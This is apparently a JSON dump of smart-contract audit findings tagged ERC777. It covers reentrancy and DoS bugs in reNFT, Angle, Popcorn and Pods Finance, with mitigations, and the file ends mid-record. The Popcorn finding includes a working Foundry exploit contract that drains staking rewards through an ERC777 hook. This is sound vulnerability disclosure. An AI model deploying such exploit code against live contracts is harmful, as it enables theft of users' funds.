@@ -1,0 +1,799 @@
+{
+  "tag": "ERC777",
+  "count": 11,
+  "metadata": {
+    "totalResults": 11,
+    "totalPages": 1
+  },
+  "last_rateLimit": {
+    "limit": 20,
+    "remaining": 18,
+    "reset": 1771761120
+  },
+  "findings": [
+    {
+      "id": "30532",
+      "kind": "GIT",
+      "auditfirm_id": "2",
+      "impact": "MEDIUM",
+      "finders_count": 2,
+      "protocol_id": "1238",
+      "title": "[M-05] DOS possible while stopping a rental with erc777 tokens",
+      "content": "\n<https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Stop.sol#L265> \n\n<https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/modules/PaymentEscrow.sol#L100>\n\nIf an order involves erc777 token for a pay order then in the `tokensReceived` callback the renter can create DOS situation resulting in the lender's assets being stuck in the rental safe.\n\n### Proof of Concept\n\n[ERC777 token standard](https://eips.ethereum.org/EIPS/eip-777) which is backward compatible with `erc20` implies that on the transfer of the tokens the recipient can implement a `tokensReceived` hook to notify of any increment of the balance.\n\nNow suppose a pay order is created with an erc 777 consideration asset as there is no restriction on that and also the eip specifies that\n\n    The difference for new contracts implementing ERC-20 is that tokensToSend and tokensReceived hooks take precedence over ERC-20. Even with an ERC-20 transfer and transferFrom call, the token contract MUST check via ERC-1820 if the from and the to address implement tokensToSend and tokensReceived hook respectively. If any hook is implemented, it MUST be called. Note that when calling ERC-20 transfer on a contract, if the contract does not implement tokensReceived, the transfer call SHOULD still be accepted even if this means the tokens will probably be locked.\n\nSo the `tokensReceived` hook is optional for a `transfer/transferFrom` call. Hence sending the assets from the lender's wallet to the escrow contract shouldn't be an issue.\n\nNow when the rental period is over or in/between, the `stopRent` method in stop policy is called, which calls `settlePayment` in escrow module. Now on the token transfer\n\n            (bool success, bytes memory data) = token.call(\n                abi.encodeWithSelector(IERC20.transfer.selector, to, value)\n            );\n\nThe `tokensReceived` hook if implemented by the renter, would be called and they could just `revert the tx` inside the `tokensReceived` hook which would mean that the assets lent by the lender are locked forever.\n\n### Recommended Mitigation Steps\n\nIt is recommended to prohibit erc777 tokens from being used as consideration items.\n\n**[0xean (Judge) decreased severity to Medium and commented](https://github.com/code-423n4/2024-01-renft-findings/issues/487#issuecomment-1917115475):**\n> Batching all the ERC777 token issues together.\n\n**[Alec1017 (reNFT) confirmed](https://github.com/code-423n4/2024-01-renft-findings/issues/487#issuecomment-1922080633)**\n\n**[reNFT mitigated](https://github.com/code-423n4/2024-02-renft-mitigation?tab=readme-ov-file#mitigations-to-be-reviewed):**\n> The PR [here](https://github.com/re-nft/smart-contracts/pull/7) - Implements a whitelist so only granted assets can be used in the protocol.<br>\n> The PR [here](https://github.com/re-nft/smart-contracts/pull/17) - Implements batching functionality for whitelisting tokens so that multiple can be added at once.\n\n**Status:** Mitigation confirmed. Full details in reports from [EV_om](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/51), [sin1st3r__](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/39) and [juancito](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/12).\n***\n\n",
+      "summary": "\nThe bug report discusses a potential issue in the code for a smart contract. The problem arises when a user creates a pay order using a specific type of token, called erc777. This token has a feature that allows the recipient to implement a special function to notify when the token balance increases. However, if a renter (the person borrowing the assets) creates a pay order with this type of token and then intentionally reverts the transaction, it could cause the lender's (the person lending the assets) assets to become stuck in the rental safe. This is because the code does not account for this type of situation and the assets are not returned to the lender.\n\nTo fix this issue, the report recommends prohibiting the use of erc777 tokens as consideration items. The severity of the bug was initially considered high, but after further review, it was downgraded to medium. The team responsible for the code has confirmed the issue and implemented a solution to mitigate it. The solution includes implementing a whitelist to only allow approved assets to be used in the protocol and adding a feature to allow multiple tokens to be added to the whitelist at once. The mitigation has been confirmed and further details can be found in the mitigation reports.",
+      "report_date": {},
+      "contest_prize_txt": "83600",
+      "contest_link": "https://code4rena.com/reports/2024-01-renft",
+      "sponsor_name": "reNFT",
+      "sponsor_link": "",
+      "quality_score": 0,
+      "general_score": 0,
+      "source_link": "https://code4rena.com/reports/2024-01-renft",
+      "github_link": "https://github.com/code-423n4/2024-01-renft-findings/issues/487",
+      "pdf_link": "",
+      "pdf_page_from": 0,
+      "contest_id": "317",
+      "slug": "m-05-dos-possible-while-stopping-a-rental-with-erc777-tokens-code4rena-renft-renft-git",
+      "firm_name": "Code4rena",
+      "firm_logo_square": "code4rena_square.png",
+      "protocol_name": "reNFT",
+      "bookmarked": false,
+      "read": false,
+      "auditfirms_auditfirm": {
+        "name": "Code4rena",
+        "logo_square": "code4rena_square.png"
+      },
+      "protocols_protocol": {
+        "name": "reNFT",
+        "protocols_protocolcategoryscore": [
+          {
+            "protocols_protocolcategory": {
+              "title": "NFT Lending"
+            },
+            "score": 1391.208791137663
+          }
+        ]
+      },
+      "issues_issuetagscore": [
+        {
+          "tags_tag": {
+            "title": "ERC777"
+          }
+        }
+      ]
+    },
+    {
+      "id": "20820",
+      "kind": "GIT",
+      "auditfirm_id": "2",
+      "impact": "MEDIUM",
+      "finders_count": 1,
+      "protocol_id": "934",
+      "title": "[M-03] Read-only reentrancy is possible",
+      "content": "\n<https://github.com/AngleProtocol/angle-transmuter/blob/9707ee4ed3d221e02dcfcd2ebaa4b4d38d280936/contracts/transmuter/facets/Swapper.sol#L206> <br><https://github.com/AngleProtocol/angle-transmuter/blob/9707ee4ed3d221e02dcfcd2ebaa4b4d38d280936/contracts/transmuter/facets/Redeemer.sol#L131> <br><https://github.com/AngleProtocol/angle-transmuter/blob/9707ee4ed3d221e02dcfcd2ebaa4b4d38d280936/contracts/savings/SavingsVest.sol#L110>\n\nThe agToken might be minted wrongly as rewards due to the reentrancy attack.\n\n### Proof of Concept\n\nThere are `redeem/swap` logics in the `transmuter` contract and all functions don't have a `nonReentrant` modifier.\n\nSo the typical reentrancy attack is possible during `redeem/swap` as I mentioned in my other report.\n\nBut besides that, the read-only reentrancy attack is possible from the `SavingsVest` contract, and the agToken might be minted/burnt incorrectly like this.\n\n1.  The [collatRatio](https://github.com/AngleProtocol/angle-transmuter/blob/9707ee4ed3d221e02dcfcd2ebaa4b4d38d280936/contracts/savings/SavingsVest.sol#L108) is `BASE_9(100%)` now and Alice starts a swap from collateral to agToken in `Swapper` contract.\n2.  In `_swap()`, it mints the agToken after depositing the collaterals.\n\n```solidity\n    if (mint) {\n        uint128 changeAmount = (amountOut.mulDiv(BASE_27, ts.normalizer, Math.Rounding.Up)).toUint128();\n        // The amount of stablecoins issued from a collateral are not stored as absolute variables, but\n        // as variables normalized by a `normalizer`\n        collatInfo.normalizedStables += uint216(changeAmount);\n        ts.normalizedStables += changeAmount;\n        if (permitData.length > 0) {\n            PERMIT_2.functionCall(permitData);\n        } else if (collatInfo.isManaged > 0)\n            IERC20(tokenIn).safeTransferFrom(\n                msg.sender,\n                LibManager.transferRecipient(collatInfo.managerData.config),\n                amountIn\n            );\n        else IERC20(tokenIn).safeTransferFrom(msg.sender, address(this), amountIn); //@audit reentrancy\n        if (collatInfo.isManaged > 0) {\n            LibManager.invest(amountIn, collatInfo.managerData.config);\n        }\n        IAgToken(tokenOut).mint(to, amountOut);\n    }\n```\n\nAfter depositing the collaterals, Alice might have a hook in the case of ERC777 tokens before the agToken is minted.\n\n3.  Then Alice calls `SavingsVest.accrue()` inside the hook and [getCollateralRatio()](https://github.com/AngleProtocol/angle-transmuter/blob/9707ee4ed3d221e02dcfcd2ebaa4b4d38d280936/contracts/savings/SavingsVest.sol#L108) will return the incorrect ratio as the agToken isn't minted yet.\n4.  So `collatRatio` will be [larger than the real value](https://github.com/AngleProtocol/angle-transmuter/blob/9707ee4ed3d221e02dcfcd2ebaa4b4d38d280936/contracts/transmuter/libraries/LibGetters.sol#L87) and additional rewards would be minted if `collatRatio > BASE_9 + BASE_6`.\n\nThen Alice would get more rewards from the `SavingsVest`.\n\n### Recommended Mitigation Steps\n\nRecommend adding the `nonReentrant` modifer to [getCollateralRatio()](https://github.com/AngleProtocol/angle-transmuter/blob/9707ee4ed3d221e02dcfcd2ebaa4b4d38d280936/contracts/transmuter/facets/Getters.sol#L78) as well as `redeem()/swap()` functions.\n\n**[Picodes (Angle) confirmed and commented](https://github.com/code-423n4/2023-06-angle-findings/issues/30#issuecomment-1628624214):**\n > So the assumption is that there is an accepted collateral `ERC777`, which is really unlikely as there is no credible candidate and it would bring additional risk. But the scenario is valid.\n\n**[Angle mitigated](https://github.com/code-423n4/2023-07-angle-mitigation/blob/main/README.md#mitigations-to-be-reviewed):**\n> PR: https://github.com/AngleProtocol/angle-transmuter/commit/864c1c47cb550f8e337244f0f70409a171a4e671<br>\n> Adds a reentrancy guard to several functions.\n\n**Status:** Mitigation confirmed. Full details in reports from [Lambda](https://github.com/code-423n4/2023-07-angle-mitigation-findings/issues/10), [auditor0517](https://github.com/code-423n4/2023-07-angle-mitigation-findings/issues/27), and [Jeiwan](https://github.com/code-423n4/2023-07-angle-mitigation-findings/issues/18).\n\n\n\n***\n\n",
+      "summary": "\nA bug was reported in the Angle Protocol's Transmuter Contract, which allows for the minting of agToken as rewards. This bug could be exploited by a reentrancy attack, which could cause the agToken to be minted incorrectly. \n\nThe bug is caused by the lack of a nonReentrant modifier in the `redeem/swap` logics in the `transmuter` contract. A read-only reentrancy attack is possible from the `SavingsVest` contract, which could result in the incorrect minting of agToken. \n\nThe attack would work as follows: Alice starts a swap from collateral to agToken in the `Swapper` contract. After depositing the collaterals, Alice could have a hook in the case of ERC777 tokens before the agToken is minted. Alice then calls `SavingsVest.accrue()` inside the hook and `getCollateralRatio()` will return the incorrect ratio as the agToken isn't minted yet. This would result in the `collatRatio` being larger than the real value, resulting in additional rewards being minted. \n\nThe recommended mitigation step is to add the `nonReentrant` modifer to `getCollateralRatio()` as well as `redeem()/swap()` functions. This has been confirmed by Picodes (Angle) and mitigated in a PR, which adds a reentrancy guard to several functions.",
+      "report_date": {},
+      "contest_prize_txt": "$52,500 USDC",
+      "contest_link": "https://code4rena.com/reports/2022-01-dev-test-repo",
+      "sponsor_name": "Angle Protocol",
+      "sponsor_link": "",
+      "quality_score": 4.5,
+      "general_score": 4,
+      "source_link": "https://code4rena.com/reports/2022-01-dev-test-repo",
+      "github_link": "https://github.com/code-423n4/2023-06-angle-findings/issues/30",
+      "pdf_link": "",
+      "pdf_page_from": 0,
+      "contest_id": "255",
+      "slug": "m-03-read-only-reentrancy-is-possible-code4rena-angle-protocol-angle-protocol-invitational-git",
+      "firm_name": "Code4rena",
+      "firm_logo_square": "code4rena_square.png",
+      "protocol_name": "Angle Protocol",
+      "bookmarked": false,
+      "read": false,
+      "auditfirms_auditfirm": {
+        "name": "Code4rena",
+        "logo_square": "code4rena_square.png"
+      },
+      "protocols_protocol": {
+        "name": "Angle Protocol",
+        "protocols_protocolcategoryscore": []
+      },
+      "issues_issuetagscore": [
+        {
+          "tags_tag": {
+            "title": "Read-only Reentrancy"
+          }
+        },
+        {
+          "tags_tag": {
+            "title": "ERC777"
+          }
+        }
+      ]
+    },
+    {
+      "id": "20815",
+      "kind": "GIT",
+      "auditfirm_id": "2",
+      "impact": "HIGH",
+      "finders_count": 2,
+      "protocol_id": "934",
+      "title": "[H-01] Possible reentrancy during redemption/swap",
+      "content": "\nRedeemers might charge more collaterals during redemption/swap by the reentrancy attack.\n\n### Proof of Concept\n\nRedeemers can redeem the agToken for collaterals in `Redeemer` contract and `_redeem()` burns the agToken and transfers the collaterals.\n\n```solidity\n    function _redeem(\n        uint256 amount,\n        address to,\n        uint256 deadline,\n        uint256[] memory minAmountOuts,\n        address[] memory forfeitTokens\n    ) internal returns (address[] memory tokens, uint256[] memory amounts) {\n        TransmuterStorage storage ts = s.transmuterStorage();\n        if (ts.isRedemptionLive == 0) revert Paused();\n        if (block.timestamp > deadline) revert TooLate();\n        uint256[] memory subCollateralsTracker;\n        (tokens, amounts, subCollateralsTracker) = _quoteRedemptionCurve(amount);\n        // Updating the normalizer enables to simultaneously and proportionally reduce the amount\n        // of stablecoins issued from each collateral without having to loop through each of them\n        _updateNormalizer(amount, false);\n\n        IAgToken(ts.agToken).burnSelf(amount, msg.sender); //@audit-info burn agToken\n\n        address[] memory collateralListMem = ts.collateralList;\n        uint256 indexCollateral;\n        for (uint256 i; i < amounts.length; ++i) {\n            if (amounts[i] < minAmountOuts[i]) revert TooSmallAmountOut();\n            // If a token is in the `forfeitTokens` list, then it is not sent as part of the redemption process\n            if (amounts[i] > 0 && LibHelpers.checkList(tokens[i], forfeitTokens) < 0) {\n                Collateral storage collatInfo = ts.collaterals[collateralListMem[indexCollateral]];\n                if (collatInfo.onlyWhitelisted > 0 && !LibWhitelist.checkWhitelist(collatInfo.whitelistData, to))\n                    revert NotWhitelisted();\n                if (collatInfo.isManaged > 0)\n                    LibManager.release(tokens[i], to, amounts[i], collatInfo.managerData.config);\n                else IERC20(tokens[i]).safeTransfer(to, amounts[i]); //@audit reentrancy\n            }\n            if (subCollateralsTracker[indexCollateral] - 1 <= i) ++indexCollateral;\n        }\n        emit Redeemed(amount, tokens, amounts, forfeitTokens, msg.sender, to);\n    }\n```\n\nDuring the collateral transfers(direct transfer or in `LibManager.release()`), there might be a hook for the recipient in the case of ERC777 tokens.\n\nThen the recipient might charge more collaterals by reentrancy like this.\n\n1.  Let's suppose there are 2 collaterals `colA` and `colB`. The transmuter contract contains 1000 amounts of `colA` and `colB`. Alice has 20 amounts of agToken.\n2.  At the first time, Alice calls `redeem()` with 10 amounts of agToken and she should receive 10 amounts of `colA` and `colB`.\n3.  As `colA` is an ERC777 token, she calls `redeem(10)` again inside the hook after the [colA transfer](https://github.com/AngleProtocol/angle-transmuter/blob/9707ee4ed3d221e02dcfcd2ebaa4b4d38d280936/contracts/transmuter/facets/Redeemer.sol#L131).\n4.  During the second redemption, total collaterals will be `colA = 990, colB = 1000` because `colB` isn't transferred in the first redemption yet.\n5.  After all, Alice will receive more collaterals in the second redemption from [this calculation](https://github.com/AngleProtocol/angle-transmuter/blob/9707ee4ed3d221e02dcfcd2ebaa4b4d38d280936/contracts/transmuter/facets/Redeemer.sol#L167).\n\nI think a similar reentrancy attack might be possible during the swap as well.\n\n### Recommended Mitigation Steps\n\nI think we should add the `nonReentrant` modifier to the major functions like `redeem()/swap()`.\n\n**[Picodes (Angle) confirmed, but disagreed with severity and commented](https://github.com/code-423n4/2023-06-angle-findings/issues/24#issuecomment-1628650145):**\n > Valid. We had this in mind but thought it was ok as we don't plan to accept collaterals with callbacks. However better than sorry and we may add the modifier.\n\n**[hansfriese (Judge) commented](https://github.com/code-423n4/2023-06-angle-findings/issues/24#issuecomment-1628722575):**\n > @Picodes - `LibManager.release()` is called during the redemption and it might have a callback although the governance doesn't accept collaterals with hooks.\n> \n> Because the assumption is practical enough and the users can steal collaterals directly, will keep as High.\n\n**[Angle mitigated](https://github.com/code-423n4/2023-07-angle-mitigation/blob/main/README.md#mitigations-to-be-reviewed):**\n> PR: https://github.com/AngleProtocol/angle-transmuter/commit/864c1c47cb550f8e337244f0f70409a171a4e671<br>\n> Adds a reentrancy guard to several functions.\n\n**Status:** Mitigation confirmed. Full details in reports from [auditor0517](https://github.com/code-423n4/2023-07-angle-mitigation-findings/issues/22), [Lambda](https://github.com/code-423n4/2023-07-angle-mitigation-findings/issues/6), and [Jeiwan](https://github.com/code-423n4/2023-07-angle-mitigation-findings/issues/13).\n\n\n\n***\n\n",
+      "summary": "\nA bug report has been raised for the Angle Protocol's Redeemer contract, which is used to redeem agToken for collaterals. The bug is that a redeemer might be able to charge more collaterals during redemption/swap by the reentrancy attack. \n\nThe attack works by exploiting the ERC777 callback feature, which is present in some collaterals. When a redeemer calls the `redeem()` function with 10 amounts of agToken, they should receive 10 amounts of the collateral. However, if the collateral is an ERC777 token, the recipient can call `redeem(10)` again inside the hook after the collateral transfer. This will result in the redeemer receiving more collaterals than expected. \n\nThe team at Angle Protocol has recommended adding the `nonReentrant` modifier to the major functions like `redeem()/swap()`. This mitigation was confirmed by the auditor, and full details can be found in the reports from auditor0517, Lambda, and Jeiwan.",
+      "report_date": {},
+      "contest_prize_txt": "$52,500 USDC",
+      "contest_link": "https://code4rena.com/reports/2022-01-dev-test-repo",
+      "sponsor_name": "Angle Protocol",
+      "sponsor_link": "",
+      "quality_score": 3,
+      "general_score": 2,
+      "source_link": "https://code4rena.com/reports/2022-01-dev-test-repo",
+      "github_link": "https://github.com/code-423n4/2023-06-angle-findings/issues/24",
+      "pdf_link": "",
+      "pdf_page_from": 0,
+      "contest_id": "255",
+      "slug": "h-01-possible-reentrancy-during-redemptionswap-code4rena-angle-protocol-angle-protocol-invitational-git",
+      "firm_name": "Code4rena",
+      "firm_logo_square": "code4rena_square.png",
+      "protocol_name": "Angle Protocol",
+      "bookmarked": false,
+      "read": false,
+      "auditfirms_auditfirm": {
+        "name": "Code4rena",
+        "logo_square": "code4rena_square.png"
+      },
+      "protocols_protocol": {
+        "name": "Angle Protocol",
+        "protocols_protocolcategoryscore": []
+      },
+      "issues_issuetagscore": [
+        {
+          "tags_tag": {
+            "title": "Reentrancy"
+          }
+        },
+        {
+          "tags_tag": {
+            "title": "ERC777"
+          }
+        }
+      ]
+    },
+    {
+      "id": "21989",
+      "kind": "GIT",
+      "auditfirm_id": "2",
+      "impact": "HIGH",
+      "finders_count": 32,
+      "protocol_id": "900",
+      "title": "[H-04] Staking rewards can be drained",
+      "content": "\nIf ERC777 tokens are used for rewards, the entire balance of rewards in the staking contract can get drained by an attacker.\n\n### Proof of Concept\n\nERC777 allow users to register a hook to notify them when tokens are transferred to them.\n\nThis hook can be used to reenter the contract and drain the rewards.\n\nThe issue is in the `claimRewards` in `MultiRewardStaking`.\nThe function does not follow the checks-effects-interactions pattern and therefore can be reentered when transferring tokens in the for loop. <br><https://github.com/code-423n4/2023-01-popcorn/blob/d95fc31449c260901811196d617366d6352258cd/src/utils/MultiRewardStaking.sol#L170-L187>\n\n      function claimRewards(address user, IERC20[] memory _rewardTokens) external accrueRewards(msg.sender, user) {\n        for (uint8 i; i < _rewardTokens.length; i++) {\n          uint256 rewardAmount = accruedRewards[user][_rewardTokens[i]];\n\n          if (rewardAmount == 0) revert ZeroRewards(_rewardTokens[i]);\n\n          EscrowInfo memory escrowInfo = escrowInfos[_rewardTokens[i]];\n\n          if (escrowInfo.escrowPercentage > 0) {\n            _lockToken(user, _rewardTokens[i], rewardAmount, escrowInfo);\n            emit RewardsClaimed(user, _rewardTokens[i], rewardAmount, true);\n          } else {\n            _rewardTokens[i].transfer(user, rewardAmount);\n            emit RewardsClaimed(user, _rewardTokens[i], rewardAmount, false);\n          }\n\n          accruedRewards[user][_rewardTokens[i]] = 0;\n        }\n\nAs can be seen above, the clearing of the `accruedRewards` is done AFTER the transfer when it should be BEFORE the transfer.\n\n**Foundry POC**\n\nThe POC demonstrates an end-to-end attack including a malicious hacker contract that steals the balance of the reward token.\n\nAdd the following file (drainRewards.t.sol) to the test directory: <br><https://github.com/code-423n4/2023-01-popcorn/tree/main/test>\n\n    // SPDX-License-Identifier: GPL-3.0\n    // Docgen-SOLC: 0.8.15\n\n    pragma solidity ^0.8.15;\n\n    import { Test } from \"forge-std/Test.sol\";\n    import { MockERC20 } from \"./utils/mocks/MockERC20.sol\";\n    import { IMultiRewardEscrow } from \"../src/interfaces/IMultiRewardEscrow.sol\";\n    import { MultiRewardStaking, IERC20 } from \"../src/utils/MultiRewardStaking.sol\";\n    import { MultiRewardEscrow } from \"../src/utils/MultiRewardEscrow.sol\";\n\n    import { ERC777 } from \"openzeppelin-contracts/token/ERC777/ERC777.sol\";\n\n    contract MockERC777 is ERC777 {\n      uint8 internal _decimals;\n      mapping(address => address) private registry;\n\n        constructor() ERC777(\"MockERC777\", \"777\", new address[](0)) {}\n\n\n      function decimals() public pure override returns (uint8) {\n        return uint8(18);\n      }\n\n      function mint(address to, uint256 value) public virtual {\n        _mint(to, value, hex'', hex'', false);\n      }\n\n      function burn(address from, uint256 value) public virtual {\n        _mint(from, value, hex'', hex'');\n      }\n    }\n\n    contract Hacker {\n        IERC20[] public rewardsTokenKeys;\n        MultiRewardStaking staking;\n        constructor(IERC20[] memory _rewardsTokenKeys, MultiRewardStaking _staking){\n          rewardsTokenKeys = _rewardsTokenKeys;\n          staking = _staking;\n\n          // register hook\n          bytes32 erc777Hash = keccak256(\"ERC777TokensRecipient\");\n          bytes memory data = abi.encodeWithSignature(\"setInterfaceImplementer(address,bytes32,address)\", address(this), erc777Hash, address(this));\n          address(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24).call(data);\n        }\n\n        // deposit into staking\n        function approveAndDeposit() external {\n          IERC20 stakingToken = IERC20(staking.asset());\n          stakingToken.approve(address(staking), 1 ether);\n          staking.deposit(1 ether);\n        }\n\n        function startHack() external {\n          // Claim and reenter until staking contract is drained\n          staking.claimRewards(address(this), rewardsTokenKeys);\n        }\n        function tokensReceived(\n            address operator,\n            address from,\n            address to,\n            uint256 amount,\n            bytes calldata userData,\n            bytes calldata operatorData\n        ) external {\n          // continue as long as the balance of the reward token is positive\n          // In real life, we should check the lower boundry to prevent a revert\n          // when trying to send more then the balance.\n          if(ERC777(msg.sender).balanceOf(address(staking)) > 0){\n            staking.claimRewards(address(this), rewardsTokenKeys);\n          }\n        }\n    }\n\n    contract DrainRewards is Test {\n      MockERC20 stakingToken;\n      MockERC777 rewardToken1;\n      IERC20 iRewardToken1;\n      MultiRewardStaking staking;\n      MultiRewardEscrow escrow;\n\n      address feeRecipient = address(0x9999);\n      \n\n      function setUp() public {\n        stakingToken = new MockERC20(\"Staking Token\", \"STKN\", 18);\n        rewardToken1 = new MockERC777();\n        iRewardToken1 = IERC20(address(rewardToken1));\n        escrow = new MultiRewardEscrow(address(this), feeRecipient);\n        staking = new MultiRewardStaking();\n        staking.initialize(IERC20(address(stakingToken)), IMultiRewardEscrow(address(escrow)), address(this));\n      }\n\n      function _addRewardToken(MockERC777 rewardsToken) internal {\n        rewardsToken.mint(address(this), 10 ether);\n        rewardsToken.approve(address(staking), 10 ether);\n        staking.addRewardToken(IERC20(address(rewardsToken)), 0.1 ether, 10 ether, false, 0, 0, 0);\n      }\n\n      function test__claim_reentrancy() public {\n        // Prepare array for `claimRewards`\n        IERC20[] memory rewardsTokenKeys = new IERC20[](1);\n        rewardsTokenKeys[0] = iRewardToken1;\n\n        // setup hacker contract\n        Hacker hacker = new Hacker(rewardsTokenKeys, staking);\n        address hackerAddr = address(hacker);\n        stakingToken.mint(hackerAddr, 1 ether);\n        hacker.approveAndDeposit();\n\n        // Add reward token to staking \n        _addRewardToken(rewardToken1);\n\n        // 10% of rewards paid out\n        vm.warp(block.timestamp + 10);\n\n        // Get the full rewards held by the staking contract\n        uint256 full_rewards_amount = iRewardToken1.balanceOf(address(staking));\n\n        // Call hacker to start claiming the rewards and reenter\n        hacker.startHack();\n\n        // validate we received 100% of rewards (10 eth)\n        assertEq(rewardToken1.balanceOf(hackerAddr), full_rewards_amount);\n      }\n    }\n\nTo run the POC, execute the following command:\n\n    forge test -m \"test__claim_reentrancy\" --fork-url=<MAINNET FORK>\n\nExpected results:\n\n    Running 1 test for test/drainRewards.t.sol:DrainRewards\n    [PASS] test__claim_reentrancy() (gas: 1018771)\n    Test result: ok. 1 passed; 0 failed; finished in 6.46s\n\n### Tools Used\n\nFoundry, VS Code\n\n### Recommended Mitigation Steps\n\nFollow the checks-effects-interactions pattern and clear out `accruedRewards[user][_rewardTokens[i]]` before transferring.\n\nAdditionally, it would be a good idea to add a ReentrancyGuard modifier to the function.\n\n**[RedVeil (Popcorn) confirmed, but disagreed with severity](https://github.com/code-423n4/2023-01-popcorn-findings/issues/402)** \n\n***\n\n",
+      "summary": "\nA bug was found in the `MultiRewardStaking` contract which allows an attacker to drain the entire balance of the rewards in the staking contract. This is due to the `claimRewards` function not following the checks-effects-interactions pattern and therefore can be reentered when transferring tokens in the for loop. A Proof of Concept (POC) was created to demonstrate an end-to-end attack including a malicious hacker contract that steals the balance of the reward token. Foundry and VS Code were used to create the POC. To mitigate the issue, it is recommended to follow the checks-effects-interactions pattern and clear out `accruedRewards[user][_rewardTokens[i]]` before transferring. Additionally, it would be a good idea to add a ReentrancyGuard modifier to the function.",
+      "report_date": {},
+      "contest_prize_txt": "$90,500 USDC",
+      "contest_link": "https://code4rena.com/reports/2023-01-popcorn",
+      "sponsor_name": "Popcorn",
+      "sponsor_link": "",
+      "quality_score": 0,
+      "general_score": 0,
+      "source_link": "https://code4rena.com/reports/2023-01-popcorn",
+      "github_link": "https://github.com/code-423n4/2023-01-popcorn-findings/issues/402",
+      "pdf_link": "",
+      "pdf_page_from": 0,
+      "contest_id": "211",
+      "slug": "h-04-staking-rewards-can-be-drained-code4rena-popcorn-popcorn-contest-git",
+      "firm_name": "Code4rena",
+      "firm_logo_square": "code4rena_square.png",
+      "protocol_name": "Popcorn",
+      "bookmarked": false,
+      "read": false,
+      "auditfirms_auditfirm": {
+        "name": "Code4rena",
+        "logo_square": "code4rena_square.png"
+      },
+      "protocols_protocol": {
+        "name": "Popcorn",
+        "protocols_protocolcategoryscore": [
+          {
+            "protocols_protocolcategory": {
+              "title": "Yield"
+            },
+            "score": 1
+          },
+          {
+            "protocols_protocolcategory": {
+              "title": "Staking Pool"
+            },
+            "score": 1
+          }
+        ]
+      },
+      "issues_issuetagscore": [
+        {
+          "tags_tag": {
+            "title": "Reentrancy"
+          }
+        },
+        {
+          "tags_tag": {
+            "title": "ERC777"
+          }
+        }
+      ]
+    },
+    {
+      "id": "10415",
+      "kind": "MARKDOWN",
+      "auditfirm_id": "7",
+      "impact": "HIGH",
+      "finders_count": 1,
+      "protocol_id": "73",
+      "title": "Reentrancy risk in depositing to the queue",
+      "content": "The internal [`_deposit`](https://github.com/pods-finance/yield-contracts/blob/9389ab46e9ecdd1ea1fd7228c9d9c6821c00f057/contracts/vaults/BaseVault.sol#L407) function handles user deposits, transferring a specified amount of `stETH` from `msg.sender` to the vault. Before moving the funds, it adds the deposit to the queue, which is processed later by the [`processQueuedDeposits`](https://github.com/pods-finance/yield-contracts/blob/9389ab46e9ecdd1ea1fd7228c9d9c6821c00f057/contracts/vaults/BaseVault.sol#L371) function.\n\n\nAs the underlying token could have hooks that allow the token sender to execute code before the transfer (e.g., ERC777 standard), a malicious user could use those hooks to re-enter the `deposit` function multiple times.\n\n\nThis re-entrancy will result in an increment in the receiver balance on the queue, even though this balance will not correspond to the actual amount deposited into the vault.\n\n\nIn the current implementation, the `_deposit` function in the `BaseVault` contract is overridden by the [implementation in the `STETHVault`](https://github.com/pods-finance/yield-contracts/blob/9389ab46e9ecdd1ea1fd7228c9d9c6821c00f057/contracts/vaults/STETHVault.sol#L113-L126), which has the correct order of operation. However, the `BaseVault` is likely to be inherited by future vaults, so it is crucial to have the correct `_deposit` implementation in this contract in case it is not overridden.\n\n\nConsider reordering the calls, doing the transfer first, and then adding the receiver to the queue to prevent this reentrancy scenario. Also, consider using [OpenZeppelin’s ERC4626 implementation](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/extensions/ERC4626.sol), which already has this solution implemented.\n\n\n**Update:** *Fixed in [PR#41](https://github.com/pods-finance/yield-contracts/pull/41), with commit `2ffcb1e` being the last one added.*",
+      "summary": "\nA bug report has been filed regarding the internal `_deposit` function in the `BaseVault` contract. This function is responsible for transferring a specified amount of `stETH` from the sender to the vault, and before doing this, it adds the deposit to the queue. It is possible for a malicious user to use hooks in the underlying token to re-enter the `deposit` function multiple times, resulting in an increment in the receiver balance on the queue, even though this balance will not correspond to the actual amount deposited into the vault. \n\nThe `_deposit` function in the `BaseVault` contract has been overridden by the implementation in the `STETHVault`, which has the correct order of operation. However, the `BaseVault` is likely to be inherited by future vaults, so it is important to have the correct `_deposit` implementation in this contract in case it is not overridden. It is suggested to reorder the calls, doing the transfer first, and then adding the receiver to the queue to prevent this reentrancy scenario. Additionally, OpenZeppelin’s ERC4626 implementation, which already has this solution implemented, can also be used. \n\nThe bug has been fixed in PR#41, with commit `2ffcb1e` being the last one added.",
+      "report_date": {},
+      "contest_prize_txt": "",
+      "contest_link": "",
+      "sponsor_name": "",
+      "sponsor_link": "",
+      "quality_score": 0,
+      "general_score": 0,
+      "source_link": "https://blog.openzeppelin.com/pods-finance-ethereum-volatility-vault-audit-1/",
+      "github_link": "",
+      "pdf_link": "",
+      "pdf_page_from": 0,
+      "contest_id": "",
+      "slug": "reentrancy-risk-in-depositing-to-the-queue-openzeppelin-pods-finance-ethereum-volatility-vault-audit-1-markdown",
+      "firm_name": "OpenZeppelin",
+      "firm_logo_square": "openzeppelin_square.png",
+      "protocol_name": "Pods Finance Ethereum Volatility Vault Audit #1",
+      "bookmarked": false,
+      "read": false,
+      "auditfirms_auditfirm": {
+        "name": "OpenZeppelin",
+        "logo_square": "openzeppelin_square.png"
+      },
+      "protocols_protocol": {
+        "name": "Pods Finance Ethereum Volatility Vault Audit #1",
+        "protocols_protocolcategoryscore": [
+          {
+            "protocols_protocolcategory": {
+              "title": "Dexes"
+            },
+            "score": 0.5
+          },
+          {
+            "protocols_protocolcategory": {
+              "title": "Yield"
+            },
+            "score": 0.5
+          },
+          {
+            "protocols_protocolcategory": {
+              "title": "Services"
+            },
+            "score": 0.5
+          },
+          {
+            "protocols_protocolcategory": {
+              "title": "Yield Aggregator"
+            },
+            "score": 0.5
+          },
+          {
+            "protocols_protocolcategory": {
+              "title": "Cross Chain"
+            },
+            "score": 0.5
+          }
+        ]
+      },
+      "issues_issuetagscore": [
+        {
+          "tags_tag": {
+            "title": "Weird ERC20"
+          }
+        },
+        {
+          "tags_tag": {
